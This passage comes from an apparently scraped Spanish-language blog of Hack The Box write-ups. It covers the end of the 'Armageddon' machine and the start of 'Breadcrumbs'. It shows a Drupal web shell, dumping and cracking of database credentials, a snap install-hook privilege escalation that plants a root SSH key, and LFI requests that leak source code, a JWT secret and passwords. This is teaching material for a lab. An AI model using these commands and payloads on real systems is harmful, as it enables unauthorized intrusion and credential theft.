$_REQUEST[\u0026#39;c\u0026#39;] . \u0026#39; 2\u0026gt;\u0026amp;1\u0026#39; ); } [+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!! -------------------------------------------------------------------------------- [i] Fake PHP shell: curl \u0026#39;http://10.129.89.116/shell.php\u0026#39; -d \u0026#39;c=hostname\u0026#39; armageddon.htb\u0026gt;\u0026gt; armageddon.htb\u0026gt;\u0026gt; whoami; id; pwd apache uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0 /var/www/html armageddon.htb\u0026gt;\u0026gt; DRUPAL DB Con esta webshell realizamos una enumeracion de los archivos de configuracion de drupal, donde encontramos el archivo de configuracion que contiene las credenciales de la base de datos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 armageddon.htb\u0026gt;\u0026gt; find . -name settings.php 2\u0026gt;/dev/null [!] WARNING: Detected an known bad character (\u0026gt;) ./sites/default/settings.php armageddon.htb\u0026gt;\u0026gt; cat ./sites/default/settings.php|grep \u0026#34;password\u0026#34; * \u0026#39;password\u0026#39; =\u0026gt; \u0026#39;password\u0026#39;, * username, password, host, and database name. * \u0026#39;password\u0026#39; =\u0026gt; \u0026#39;password\u0026#39;, * \u0026#39;password\u0026#39; =\u0026gt; \u0026#39;password\u0026#39;, * \u0026#39;password\u0026#39; =\u0026gt; \u0026#39;password\u0026#39;, * \u0026#39;password\u0026#39; =\u0026gt; \u0026#39;password\u0026#39;, \u0026#39;password\u0026#39; =\u0026gt; \u0026#39;CQHEy@9M*m23gBVj\u0026#39;, * by using the username and password variables. The proxy_user_agent variable # $conf[\u0026#39;proxy_password\u0026#39;] = \u0026#39;\u0026#39;; armageddon.htb\u0026gt;\u0026gt; $databases = array ( \u0026#39;default\u0026#39; =\u0026gt; array ( \u0026#39;default\u0026#39; =\u0026gt; array ( \u0026#39;database\u0026#39; =\u0026gt; \u0026#39;drupal\u0026#39;, \u0026#39;username\u0026#39; =\u0026gt; \u0026#39;drupaluser\u0026#39;, \u0026#39;password\u0026#39; =\u0026gt; \u0026#39;CQHEy@9M*m23gBVj\u0026#39;, \u0026#39;host\u0026#39; =\u0026gt; \u0026#39;localhost\u0026#39;, \u0026#39;port\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;driver\u0026#39; =\u0026gt; \u0026#39;mysql\u0026#39;, \u0026#39;prefix\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, ), ), ); Utilizando estas credenciales con mysql, logrando obtener la contraseña encriptada de la base de datos de drupal del usuario brucetherealadmin.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 armageddon.htb\u0026gt;\u0026gt; mysql -u drupaluser -p\u0026#39;CQHEy@9M*m23gBVj\u0026#39; -e \u0026#34;show databases;\u0026#34; Database information_schema drupal mysql performance_schema armageddon.htb\u0026gt;\u0026gt; mysql -u drupaluser -p\u0026#39;CQHEy@9M*m23gBVj\u0026#39; -e \u0026#34;use drupal; show tables;\u0026#34; Tables_in_drupal actions authmap [... REDACTED ...] users users_roles variable watchdog armageddon.htb\u0026gt;\u0026gt; mysql -u drupaluser -p\u0026#39;CQHEy@9M*m23gBVj\u0026#39; -e \u0026#34;use drupal; describe users;\u0026#34; Field Type Null Key Default Extra uid int(10) unsigned NO PRI 0 name varchar(60) NO UNI pass varchar(128) NO mail varchar(254) YES MUL theme varchar(255) NO signature varchar(255) NO signature_format varchar(255) YES NULL created int(11) NO MUL 0 access int(11) NO MUL 0 login int(11) NO 0 status tinyint(4) NO 0 timezone varchar(32) YES NULL language varchar(12) NO picture int(11) NO MUL 0 init varchar(254) YES data longblob YES NULL armageddon.htb\u0026gt;\u0026gt; mysql -u drupaluser -p\u0026#39;CQHEy@9M*m23gBVj\u0026#39; -e \u0026#34;use drupal; select uid,name,pass from users;\u0026#34; uid name pass 0 1 brucetherealadmin $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt armageddon.htb\u0026gt;\u0026gt; JOHN Utilizamos John para obtener en texto plano la contraseña.\n1 2 3 4 5 6 7 8 9 10 11 ┌──(kali㉿kali)-[~/htb/armageddon] └─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash_brucetherealadmin Using default input encoding: UTF-8 Loaded 1 password hash (Drupal7, $S$ [SHA512 256/256 AVX2 4x]) Cost 1 (iteration count) is 32768 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status booboo (?) 1g 0:00:00:00 DONE (2021-03-28 03:24) 2.000g/s 464.0p/s 464.0c/s 464.0C/s tiffany..harley Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed BRUCE - USER Ingresamos por el servicio SSH, logrando obtener una shell con el usuario brucetherealadmin y la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 ┌──(kali㉿kali)-[~/htb/armageddon] └─$ ssh brucetherealadmin@10.129.89.116 # booboo 130 ⨯ brucetherealadmin@10.129.89.116\u0026#39;s password: Last failed login: Sun Mar 28 08:13:18 BST 2021 from 10.10.14.48 on ssh:notty There was 1 failed login attempt since the last successful login. Last login: Tue Mar 23 12:40:36 2021 from 10.10.14.2 [brucetherealadmin@armageddon ~]$ whoami;id;pwd brucetherealadmin uid=1000(brucetherealadmin) gid=1000(brucetherealadmin) groups=1000(brucetherealadmin) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 /home/brucetherealadmin [brucetherealadmin@armageddon ~]$ ls user.txt [brucetherealadmin@armageddon ~]$ cat user.txt| cut -c1-15 69eb27ca88fbbd9 PRIVILEGE ESCALATION El usuario actual puede ejecutar el comando sudo snap install * por lo que podriamos instalar snaps. Verificamos si exsitia algun paquete instalado y observamos solamente el core, además encontramos que la version de snap es la 2.47.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 [brucetherealadmin@armageddon ~]$ sudo -l -l Matching Defaults entries for brucetherealadmin on armageddon: !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep=\u0026#34;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS\u0026#34;, env_keep+=\u0026#34;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE\u0026#34;, env_keep+=\u0026#34;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES\u0026#34;, env_keep+=\u0026#34;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE\u0026#34;, env_keep+=\u0026#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY\u0026#34;, secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/bin User brucetherealadmin may run the following commands on armageddon: Sudoers entry: RunAsUsers: root Options: !authenticate Commands: /usr/bin/snap install * [brucetherealadmin@armageddon ~]$ [brucetherealadmin@armageddon ~]$ snap list Name Version Rev Tracking Publisher Notes core 16-2.49 10859 latest/stable canonical✓ core [brucetherealadmin@armageddon ~]$ snap --version snap 2.47.1-1.el7 snapd 2.47.1-1.el7 series 16 centos 7 kernel 3.10.0-1160.6.1.el7.x86_64 [brucetherealadmin@armageddon ~]$ Despues de realizar una busqueda de posibles exploits o vulnerabilidades relacionadas a snap, encontramos dirty_sock, el cual se aprovecha de la instalacion de un snap a traves de la API de snap y la instalacion de hooks, lo que permitiría obtener acceso privilegiado en el sistema. Existen dos exploits, dirty_sockv1 se aprovecha de la API de snap para la creacion de un usuario utilizando una cuenta de Ubuntu SSO aunque es necesario que la maquina tenga acceso a internet. dirty_sockv2 en este, se utilizan los hooks de snap para ejecutar comandos cuando un paquete es instalado en modo devmode.\n\u0026hellip; snaps have something called “hooks”. One such hook, the “install hook” is run at the time of snap installation and can be a simple shell script. If the snap is configured in “devmode”, then this hook will be run in the context of root.\nEn esta maquina al poder instalar paquetes mediante sudo los hooks se estarían ejecutando como root. Creamos nuestro propio paquete utilizando los comandos de dirtysockv2 de este post, aunque a diferencia de este agregamos la clave publica del usuario brucetherealadmin al archivo /root/.ssh/authorized_keys en el script snap/hooks/install, para poder tener acceso a traves de SSH en localhost.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 [brucetherealadmin@armageddon ~]$ ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (/home/brucetherealadmin/.ssh/id_rsa): Created directory \u0026#39;/home/brucetherealadmin/.ssh\u0026#39;. Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /home/brucetherealadmin/.ssh/id_rsa. Your public key has been saved in /home/brucetherealadmin/.ssh/id_rsa.pub. The key fingerprint is: SHA256:DjcytDVT0BIUbXeGj0gziVxCQXuKut8Qzdkkd4iRMcE brucetherealadmin@armageddon.htb The key\u0026#39;s randomart image is: +---[RSA 2048]----+ | *#\u0026amp;o. . | | EBO.o o | | . B+==.= | | . * @... . | | B S . | | . B . | | . . . | | . o | | ... . | +----[SHA256]-----+ [brucetherealadmin@armageddon ~]$ cat ~/.ssh/id_rsa.pub ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDEXyP4V63iTvxbzKeHw4loojfsZHI0hWLwDnaE043yxtsvItYh7JGQf5SkTjFHe2LOuDSrEL0u8OFQAZvIwubxmeqfuGIBXOoZRQKyfCA8bayCce9w2MdG9w1xX4dZZ45ht38Y17EWvZipxyOVMZQYuld3aBs5S5FV8Ii6r3HTpLOvhXMHxoti9NAr6wAxbcNKA28lNYriCgAsNvGW8ieIrhIw44luU9nZaNS4NfRkuLLh2/Bii0axUA1f0ZkhTOtIWk0REMQALDJrfgvjV+5b+EQGgfsQ8/dvzy7tWPargurCFTSQwCuHXHs+4t1Hvv32e+fKi4F7iu/YG6xyyZXj brucetherealadmin@armageddon.htb [brucetherealadmin@armageddon ~]$ Hay que mencionar que es posible ejecutar algun otro tipo de comando en el hook, tambien, el script original del hook no funciona en esta maquina para obtener acceso privilegiado ya que no existe el grupo sudo en la maquina.\nEn caso de algun tipo de error utilizar #!/bin/sh -e en lugar de #!/bin/bash.\nCreamos el snap con los siguientes comandos:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 ## Initialize the directory as a snap project snapcraft init ## Set up the install hook mkdir snap/hooks touch snap/hooks/install chmod a+x snap/hooks/install ## Write the script we want to execute as root cat \u0026gt; snap/hooks/install \u0026lt;\u0026lt; \u0026#34;EOF\u0026#34; #!/bin/sh -e mkdir /root/.ssh/ echo \u0026#34;ssh-rsa AAAAB3NzaC1yc[...]+4t1Hvv32e+fKi4F7iu/YG6xyyZXj brucetherealadmin@armageddon.htb\u0026#34; \u0026gt;\u0026gt; /root/.ssh/authorized_keys EOF ## Configure the snap yaml file cat \u0026gt; snap/snapcraft.yaml \u0026lt;\u0026lt; \u0026#34;EOF\u0026#34; name: dirty-sock version: \u0026#39;0.1\u0026#39; summary: Empty snap, used for exploit description: | See https://github.com/initstring/dirty_sock grade: devel confinement: devmode parts: my-part: plugin: nil EOF ## Build the snap snapcraft Con esto se creará el archivo dirty-sock_0.1_amd64.snap el cual trasladamos a la maquin e instalamos en modo devmode, al no haber ningun tipo de error verificamos que los comandos fueron ejecutados ingresando al usuario root mediante SSH, lo cual nos permitió obtener una shell y flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 brucetherealadmin@armageddon ~]$ sudo snap install dirty-sock_0.1_amd64.snap --devmode dirty-sock 0.1 installed [brucetherealadmin@armageddon ~]$ [brucetherealadmin@armageddon ~]$ ssh root@localhost The authenticity of host \u0026#39;localhost (::1)\u0026#39; can\u0026#39;t be established. ECDSA key fingerprint is SHA256:bC1R/FE5sI72ndY92lFyZQt4g1VJoSNKOeAkuuRr4Ao. ECDSA key fingerprint is MD5:3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added \u0026#39;localhost\u0026#39; (ECDSA) to the list of known hosts. Last login: Tue Mar 23 12:51:31 2021 [root@armageddon ~]# whoami root [root@armageddon ~]# ls anaconda-ks.cfg cleanup.sh passwd reset.sh root.txt snap [root@armageddon ~]# cat root.txt | cut -c1-15 7ed932f4e56933d [root@armageddon ~]# CRONTAB Con el usuario root encontramos dos crons, los cuales restauran archivos, limpian carpetas y eliminan los snaps instalados.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 [root@armageddon ~]# crontab -l 5 * * * * /root/reset.sh * * * * * /root/cleanup.sh [root@armageddon ~]# cat /root/reset.sh #!/bin/bash cp /root/passwd /etc/passwd rm -rf /tmp/* /dev/shm/* [root@armageddon ~]# cat /root/cleanup.sh #!/bin/bash /usr/bin/snap list | tail -n +2 | grep -v \u0026#39;^core \u0026#39; | awk \u0026#39;{print $1}\u0026#39; | while read s do /usr/bin/snap remove --purge \u0026#34;$s\u0026#34; done [root@armageddon ~]# ","description":"Armageddon una maquina de HackTheBox con SO Linux, encontramos una version de Drupal desactualizada por donde obtuvimos acceso. Tras obtener credenciales de una base de datos cambiamos a un siguiente usuario, y, con este ultimo escalamos privilegios creando un paquete de snap.","id":55,"section":"posts","tags":["drupal","drupalgeddon2","snap"],"title":"Hack The Box - Armageddon","uri":"https://sckull.github.io/posts/armageddon/"},{"content":"\rBreadcrumbs expone un sitio web donde descubrimos una vulnerabilidad LFI la cual nos proporcionó la informacion para obtener acceso como admin, para luego obtener credenciales y acceder por SSH. Obtuvimos acceso al siguiente usuario con credenciales en la aplicacion de Notas de Windows. Con Proxychains creamos un tunnel para acceder a una aplicacion donde encontramos la contraseña del administrador.\nNombre Breadcrumbs OS Windows Puntos 40 Dificultad Dificil IP 10.10.10.228 Maker helich0pper\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[7.6, 6.7, 4.6, 5.4, 3.3],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[7, 10, 1, 9, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon NMAP Escaneo de puertos con nmap nos muestra el puerto http/s (80, 443), ssh (22), smb (139, 445), mysql (3306) y el puerto rpc (135) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 # Nmap 7.91 scan initiated Thu May 27 17:55:50 2021 as: nmap -Pn -sV -sC -p22,80,135,139,443,445,3306,5040,49664,49666,49667,49668,49669 -oN scan_ports 10.10.10.228 Nmap scan report for 10.10.10.228 (10.10.10.228) Host is up (0.26s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0) | ssh-hostkey: | 2048 9d:d0:b8:81:55:54:ea:0f:89:b1:10:32:33:6a:a7:8f (RSA) | 256 1f:2e:67:37:1a:b8:91:1d:5c:31:59:c7:c6:df:14:1d (ECDSA) |_ 256 30:9e:5d:12:e3:c6:b7:c6:3b:7e:1e:e7:89:7e:83:e4 (ED25519) 80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1 |_http-title: Library 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 443/tcp open ssl/http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1 |_http-title: Library | ssl-cert: Subject: commonName=localhost | Not valid before: 2009-11-10T23:48:47 |_Not valid after: 2019-11-08T23:48:47 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 445/tcp open microsoft-ds? 3306/tcp open mysql? | fingerprint-strings: | Help, Kerberos, SMBProgNeg, WMSRequest: |_ Host \u0026#39;10.10.14.25\u0026#39; is not allowed to connect to this MariaDB server 5040/tcp open unknown 49664/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port3306-TCP:V=7.91%I=7%D=5/27%Time=60B01574%P=x86_64-pc-linux-gnu%r(He SF:lp,4A,\u0026#34;F\\0\\0\\x01\\xffj\\x04Host\\x20\u0026#39;10\\.10\\.14\\.25\u0026#39;\\x20is\\x20not\\x20allow SF:ed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\u0026#34;)%r(Kerberos,4A, SF:\u0026#34;F\\0\\0\\x01\\xffj\\x04Host\\x20\u0026#39;10\\.10\\.14\\.25\u0026#39;\\x20is\\x20not\\x20allowed\\x20 SF:to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\u0026#34;)%r(SMBProgNeg,4A,\u0026#34;F\\0 SF:\\0\\x01\\xffj\\x04Host\\x20\u0026#39;10\\.10\\.14\\.25\u0026#39;\\x20is\\x20not\\x20allowed\\x20to\\x SF:20connect\\x20to\\x20this\\x20MariaDB\\x20server\u0026#34;)%r(WMSRequest,4A,\u0026#34;F\\0\\0\\x SF:01\\xffj\\x04Host\\x20\u0026#39;10\\.10\\.14\\.25\u0026#39;\\x20is\\x20not\\x20allowed\\x20to\\x20co SF:nnect\\x20to\\x20this\\x20MariaDB\\x20server\u0026#34;); Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: -44m27s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-05-27T21:14:05 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu May 27 17:58:47 2021 -- 1 IP address (1 host up) scanned in 177.03 seconds RPCCLIENT \u0026amp; SMB El puerto RPC y SMB no muestran informacion en sesion null.\n1 2 3 4 π ~/htb/breadcrumbs ❯ rpcclient -N -U \u0026#34;\u0026#34; -L \\\\10.10.10.228 Cannot connect to server. Error was NT_STATUS_UNSUCCESSFUL π ~/htb/breadcrumbs ❯ smbclient -N -U \u0026#34;\u0026#34; -L \\\\10.10.10.228 session setup failed: NT_STATUS_ACCESS_DENIED HTTP Encontramos una pagina aparentemente estatica con una opcion de verificar libros.\nVemos un buscador de libros por Titulo y Autor.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos en las direcciones / y /portal/.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 π ~/htb/breadcrumbs ❯ gobuster dir -u http://10.10.10.228/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q t 50 -x php,html,txt,xml,json /index.php (Status: 200) [Size: 2368] /books (Status: 301) [Size: 336] [--\u0026gt; http://10.10.10.228/books/] /php (Status: 301) [Size: 334] [--\u0026gt; http://10.10.10.228/php/] /portal (Status: 301) [Size: 337] [--\u0026gt; http://10.10.10.228/portal/] /css (Status: 301) [Size: 334] [--\u0026gt; http://10.10.10.228/css/] /includes (Status: 301) [Size: 339] [--\u0026gt; http://10.10.10.228/includes/] /db (Status: 301) [Size: 333] [--\u0026gt; http://10.10.10.228/db/] /examples (Status: 503) [Size: 401] /js (Status: 301) [Size: 333] [--\u0026gt; http://10.10.10.228/js/] /licenses (Status: 403) [Size: 420] π ~/htb/breadcrumbs ❯ gobuster dir -u http://10.10.10.228/portal/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q t 50 -x php,html,txt,xml,json /index.php (Status: 302) [Size: 0] [--\u0026gt; login.php] /login.php (Status: 200) [Size: 2508] /uploads (Status: 301) [Size: 345] [--\u0026gt; http://10.10.10.228/portal/uploads/] /signup.php (Status: 200) [Size: 2735] /assets (Status: 301) [Size: 344] [--\u0026gt; http://10.10.10.228/portal/assets/] /php (Status: 301) [Size: 341] [--\u0026gt; http://10.10.10.228/portal/php/] /includes (Status: 301) [Size: 346] [--\u0026gt; http://10.10.10.228/portal/includes/] /db (Status: 301) [Size: 340] [--\u0026gt; http://10.10.10.228/portal/db/] /logout.php (Status: 302) [Size: 12] [--\u0026gt; login.php] /vendor (Status: 301) [Size: 344] [--\u0026gt; http://10.10.10.228/portal/vendor/] /cookie.php (Status: 200) [Size: 0] PORTAL Registramos e ingresamos en el portal, observamos diferentes opciones, una de ellas está \u0026ldquo;deshabilitada\u0026rdquo;, tambien se muestran algunos problemas (Issues) que presenta la \u0026ldquo;plataforma\u0026rdquo;.\nTambien una lista de posibles nombres de usuarios y su posicion/rol dentro de la plataforma, se lista tambien nuestro usuario (user), finalmente en File management que al parecer no tenemos acceso ya que redirige nuevamente a la pagina principal.\nLFI Modificando los diferentes parametros de la busqueda de libros (/php/books.php), vemos un error el cual muestra que falta el \u0026ldquo;parametro\u0026rdquo; books y además se muestra file_get_contents lo que quiere decir que realiza la lectura de archivos y los presenta en la pagina.\nVerificamos esto en las opciones de busqueda de libros y vemos que al precionar la opcion de Reservar en /php/books.php envia el nombre de un archivo html, y muestra el contenido de este en un Modal.\nSOURCE CODE Utilizando esta informacion logramos obtener el codigo fuente de las paginas existentes y que enumeramos con Gobuster. Como por ejemplo el controlador de autenticacion (authController.php) en el cual incluye como se realiza una sesion (PHPSESSID) y lo que parece ser un token de JWT.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 // book=../portal/authController.php\u0026amp;method=1 \u0026lt;?php require \u0026#39;db/db.php\u0026#39;; require \u0026#34;cookie.php\u0026#34;; require \u0026#34;vendor/autoload.php\u0026#34;; use FirebaseJWTJWT; $errors = array(); $username = \u0026#34;\u0026#34;; $userdata = array(); $valid = false; $IP = $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]; //if user clicks on login if ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] === \u0026#34;POST\u0026#34;) { if ($_POST[\u0026#39;method\u0026#39;] == 0) { $username = $_POST[\u0026#39;username\u0026#39;]; $password = $_POST[\u0026#39;password\u0026#39;]; $query = \u0026#34;SELECT username,position FROM users WHERE username=? LIMIT 1\u0026#34;; $stmt = $con-\u0026gt;prepare($query); $stmt-\u0026gt;bind_param(\u0026#39;s\u0026#39;, $username); $stmt-\u0026gt;execute(); $result = $stmt-\u0026gt;get_result(); while ($row = $result-\u0026gt;fetch_array(MYSQLI_ASSOC)) { array_push($userdata, $row); } $userCount = $result-\u0026gt;num_rows; $stmt-\u0026gt;close(); if ($userCount \u0026gt; 0) { $password = sha1($password); $passwordQuery = \u0026#34;SELECT * FROM users WHERE password=? AND username=? LIMIT 1\u0026#34;; $stmt = $con-\u0026gt;prepare($passwordQuery); $stmt-\u0026gt;bind_param(\u0026#39;ss\u0026#39;, $password, $username); $stmt-\u0026gt;execute(); $result = $stmt-\u0026gt;get_result(); if ($result-\u0026gt;num_rows \u0026gt; 0) { $valid = true; } $stmt-\u0026gt;close(); } if ($valid) { session_id(makesession($username)); session_start(); $secret_key = \u0026#39;6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e\u0026#39;; $data = array(); $payload = array( \u0026#34;data\u0026#34; =\u0026gt; array( \u0026#34;username\u0026#34; =\u0026gt; $username ) ); $jwt = JWT::encode($payload, $secret_key, \u0026#39;HS256\u0026#39;); setcookie(\u0026#34;token\u0026#34;, $jwt, time() + (86400 * 30) , \u0026#34;/\u0026#34;); $_SESSION[\u0026#39;username\u0026#39;] = $username; $_SESSION[\u0026#39;loggedIn\u0026#39;] = true; if ($userdata[0][\u0026#39;position\u0026#39;] == \u0026#34;\u0026#34;) { $_SESSION[\u0026#39;role\u0026#39;] = \u0026#34;Awaiting approval\u0026#34;; } else { $_SESSION[\u0026#39;role\u0026#39;] = $userdata[0][\u0026#39;position\u0026#39;]; } header(\u0026#34;Location: /portal\u0026#34;); } else { $_SESSION[\u0026#39;loggedIn\u0026#39;] = false; $errors[\u0026#39;valid\u0026#39;] = \u0026#34;Username or Password incorrect\u0026#34;; } } elseif ($_POST[\u0026#39;method\u0026#39;] == 1) { $username = $_POST[\u0026#39;username\u0026#39;]; $password = $_POST[\u0026#39;password\u0026#39;]; $passwordConf = $_POST[\u0026#39;passwordConf\u0026#39;]; if (empty($username)) { $errors[\u0026#39;username\u0026#39;] = \u0026#34;Username Required\u0026#34;; } if (strlen($username) \u0026lt; 4) { $errors[\u0026#39;username\u0026#39;] = \u0026#34;Username must be at least 4 characters long\u0026#34;; } if (empty($password)) { $errors[\u0026#39;password\u0026#39;] = \u0026#34;Password Required\u0026#34;; } if ($password !== $passwordConf) { $errors[\u0026#39;passwordConf\u0026#39;] = \u0026#34;Passwords don\u0026#39;t match!\u0026#34;; } $userQuery = \u0026#34;SELECT * FROM users WHERE username=? LIMIT 1\u0026#34;; $stmt = $con-\u0026gt;prepare($userQuery); $stmt-\u0026gt;bind_param(\u0026#39;s\u0026#39;, $username); $stmt-\u0026gt;execute(); $result = $stmt-\u0026gt;get_result(); $userCount = $result-\u0026gt;num_rows; $stmt-\u0026gt;close(); if ($userCount \u0026gt; 0) { $errors[\u0026#39;username\u0026#39;] = \u0026#34;Username already exists\u0026#34;; } if (count($errors) === 0) { $password = sha1($password); $sql = \u0026#34;INSERT INTO users(username, password, age, position) VALUES (?,?, 0, \u0026#39;\u0026#39;)\u0026#34;; $stmt = $con-\u0026gt;prepare($sql); $stmt-\u0026gt;bind_param(\u0026#39;ss\u0026#39;, $username, $password); if ($stmt-\u0026gt;execute()) { $user_id = $con-\u0026gt;insert_id; header(\u0026#39;Location: login.php\u0026#39;); } else { $_SESSION[\u0026#39;loggedIn\u0026#39;] = false; $errors[\u0026#39;db_error\u0026#39;] = \u0026#34;Database error: failed to register\u0026#34;; } } } } MYSQL Tambien encontramos las credenciales de la base de datos, intentamos ingresar mediante el puerto mysql pero no fue posible, probablemente solo esten permitidas las conexiones locales.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 # book=../portal/db/db.php\u0026amp;method=1\u0026amp; # \u0026lt;?php #\t$host=\u0026#34;localhost\u0026#34;; #\t$port=3306; #\t$user=\u0026#34;bread\u0026#34;; #\t$password=\u0026#34;jUli901\u0026#34;; #\t$dbname=\u0026#34;bread\u0026#34;; #\t$con = new mysqli($host, $user, $password, $dbname, $port) or die (\u0026#39;Could not connect to the database server\u0026#39; . mysqli_connect_error()); # ?\u0026gt; π ~/htb/breadcrumbs ❯ mysql -h 10.10.10.228 -u bread -p Enter password: ERROR 1130 (HY000): Host \u0026#39;10.10.14.25\u0026#39; is not allowed to connect to this MariaDB server π ~/htb/breadcrumbs ❯ Paul - ADMIN Token \u0026amp; Session Enumerando los archivos del controlador de autenticacion (authController.php), encontramos fileController.php en el cual se indica como se valida el token jwt, mostrando la clave secreta, tambien se muestra el usuario \u0026ldquo;admin\u0026rdquo; paul.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 // book=../portal/includes/fileController.php\u0026amp;method=1 \u0026lt;?php $ret = \u0026#34;\u0026#34;; require \u0026#34;../vendor/autoload.php\u0026#34;; use FirebaseJWTJWT; session_start(); function validate(){ $ret = false; $jwt = $_COOKIE[\u0026#39;token\u0026#39;]; $secret_key = \u0026#39;6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e\u0026#39;; $ret = 